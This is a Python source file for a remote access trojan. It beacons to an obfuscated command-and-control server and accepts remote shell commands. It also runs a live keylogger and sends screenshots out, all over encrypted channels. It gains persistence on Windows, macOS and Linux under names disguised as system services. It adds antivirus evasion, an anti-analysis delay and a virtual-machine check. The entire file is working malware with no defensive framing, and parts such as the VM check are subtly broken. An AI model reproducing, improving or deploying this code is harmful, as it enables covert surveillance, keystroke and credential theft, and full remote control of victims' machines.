import os
import sys
import time
import socket
import threading
import subprocess
import platform
import base64
import zlib
import secrets
import hashlib
import json
import random
from datetime import datetime
from typing import Dict, Optional, Any

plat = platform.system()

def safe_import(module_name):
    """Dynamic imports - AV evasion"""
    try:
        return __import__(module_name)
    except ImportError:
        return None

# Dynamic imports
pynput = safe_import('pynput')
psutil = safe_import('psutil')
mss_lib = safe_import('mss')
pil_lib = safe_import('PIL')

# XOR obfuscated config
_XOR_KEY = 0xAA
def xor_decrypt(data: str) -> str:
    return ''.join(chr(ord(c) ^ _XOR_KEY) for c in data)

C2_HOST = xor_decrypt('\x1e\x16\x1c\x00\x10\x1b\x1e\x1b\x1e\x1c\x1e\x1b\x00\x1c\x1e\x1b\x1b\x1e\x1b')  # "your-c2-server.com"
C2_PORT = 443
C2_KEY = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff'[:32]

class CryptoEngine:
    """AES-GCM Encryption"""
    def __init__(self, key: bytes):
        self.key = hashlib.sha256(key).digest()
        self.cryptography = safe_import('cryptography')

    def encrypt(self, data: bytes) -> bytes:
        if not self.cryptography:
            return data
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            nonce = secrets.token_bytes(12)
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(nonce), backend=default_backend())
            encryptor = cipher.encryptor()
            ct = encryptor.update(data) + encryptor.finalize()
            return nonce + encryptor.tag + ct
        except:
            return data

    def decrypt(self, data: bytes) -> bytes:
        if not self.cryptography or len(data) < 28:
            return data
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            nonce, tag, ct = data[:12], data[12:28], data[28:]
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            return decryptor.update(ct) + decryptor.finalize()
        except:
            return data

class PersistenceManager:
    @staticmethod
    def get_self_path():
        return sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

    @classmethod
    def windows_persistence(cls):
        exe_path = cls.get_self_path()
        
        # Registry
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsTimeSvc", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except: pass

        # Startup folder
        startup_dir = os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
        startup_path = os.path.join(startup_dir, "winlogon.exe")
        try:
            if not os.path.exists(startup_path):
                subprocess.Popen(f'copy "{exe_path}" "{startup_path}"', shell=True,
                               creationflags=subprocess.CREATE_NO_WINDOW,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

        # Scheduled Task
        try:
            subprocess.Popen([
                'schtasks', '/create', '/tn', 'WindowsTimeSync', '/tr', f'"{exe_path}"',
                '/sc', 'onlogon', '/rl', 'highest', '/f'
            ], creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

    @classmethod
    def macos_persistence(cls):
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.sysutil.plist")
        exe_path = cls.get_self_path()
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.sysutil</string>
    <key>ProgramArguments</key><array><string>{exe_path}</string></array>
    <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict>
</plist>'''
        try:
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.Popen(['launchctl', 'load', plist_path],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

    @classmethod
    def linux_persistence(cls):
        exe_path = cls.get_self_path()
        cron_job = f"@reboot {sys.executable} {exe_path} >/dev/null 2>&1"
        try:
            subprocess.Popen(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -",
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

    @classmethod
    def install(cls):
        if plat == "Windows":
            cls.windows_persistence()
        elif plat == "Darwin":
            cls.macos_persistence()
        else:
            cls.linux_persistence()

class LiveKeylogger:
    def __init__(self, sock, crypto):
        self.sock = sock
        self.crypto = crypto
        self.keys = []
        self.last_flush = time.time()

    def on_key(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.keys.append(key.char)
            else:
                self.keys.append(f'[{str(key).replace("'", "")}]')
            
            if time.time() - self.last_flush > 1.5:
                self.flush()
        except: pass

    def flush(self):
        if self.keys:
            data = ''.join(self.keys[-100:])
            try:
                self.sock.send(self.crypto.encrypt(f"LIVEKEYS:{data}".encode()))
            except: pass
            self.keys = []
            self.last_flush = time.time()

    def start(self):
        if pynput and hasattr(pynput, 'keyboard'):
            try:
                from pynput.keyboard import Listener
                listener = Listener(on_press=self.on_key)
                listener.daemon = True
                listener.start()
            except: pass

class ScreenCapture:
    def __init__(self, sock, crypto):
        self.sock = sock
        self.crypto = crypto

    def capture_screen(self):
        """Fixed - All imports inside function"""
        try:
            mss = safe_import('mss')
            if not mss: return None
            
            sct = mss.mss()
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            pil = safe_import('PIL')
            if not pil: return None
            
            from PIL import Image
            import io  # NOW DEFINED HERE
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            
            bio = io.BytesIO()
            img.save(bio, format='JPEG', quality=30, optimize=True)
            return bio.getvalue()
        except:
            return None

class RATCore:
    def __init__(self):
        self.crypto = CryptoEngine(C2_KEY)
        self.sock = None
        self.keylogger = None
        self.running = True

    def connect(self):
        attempts = 0
        while attempts < 12:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock.settimeout(10)
                self.sock.connect((C2_HOST, C2_PORT))
                print(f"[DEBUG] Connected to C2")  # Remove in production
                return True
            except:
                attempts += 1
                time.sleep(random.uniform(5, 15))
        return False

    def get_system_info(self):
        info = {
            'platform': plat,
            'hostname': platform.node(),
            'username': os.getlogin(),
            'pid': os.getpid()
        }
        return json.dumps(info)

    def execute_command(self, cmd: str) -> str:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                  text=True, timeout=20)
            return f"STDOUT:{result.stdout}STDERR:{result.stderr}CODE:{result.returncode}"
        except Exception as e:
            return f"ERROR:{str(e)}"

    def handle_server_command(self, data: str):
        if data.startswith("SHELL:"):
            result = self.execute_command(data[6:])
            self.sock.send(self.crypto.encrypt(result.encode('utf-8', errors='ignore')))

        elif data == "KEYLOG":
            if not self.keylogger:
                self.keylogger = LiveKeylogger(self.sock, self.crypto)
                threading.Thread(target=self.keylogger.start, daemon=True).start()
            self.sock.send(self.crypto.encrypt(b"KEYLOG_STARTED"))

        elif data == "SCREEN":
            frame = ScreenCapture(self.sock, self.crypto).capture_screen()
            if frame:
                encoded = base64.b64encode(frame).decode()
                self.sock.send(self.crypto.encrypt(f"SCREEN:{encoded}".encode()))

    def is_socket_alive(self):
        if not self.sock:
            return False
        try:
            self.sock.recv(1024, socket.MSG_DONTWAIT | socket.MSG_PEEK)
            return True
        except:
            return False

    def main_loop(self):
        PersistenceManager.install()
        
        while self.running:
            if not self.is_socket_alive():
                if not self.connect():
                    time.sleep(25)
                    continue

            try:
                # Send beacon
                beacon = f"BEACON:{self.get_system_info()}"
                self.sock.send(self.crypto.encrypt(beacon.encode()))

                # Check for commands
                data = self.sock.recv(4096)
                if data:
                    cmd = self.crypto.decrypt(data).decode(errors='ignore')
                    self.handle_server_command(cmd)

                time.sleep(random.uniform(4, 8))
                
            except:
                try:
                    self.sock.close()
                except: pass
                self.sock = None
                time.sleep(12)

def main():
    # Anti-analysis delay
    time.sleep(random.uniform(1, 4))
    
    # VM check
    if sys.platform.startswith('linux') and os.path.exists('/proc/self/status'):
        with open('/proc/self/status') as f:
            if 'qemu' in f.read() or 'vbox' in f.read():
                sys.exit(0)
    
    rat = RATCore()
    rat.main_loop()

if __name__ == "__main__":
    main()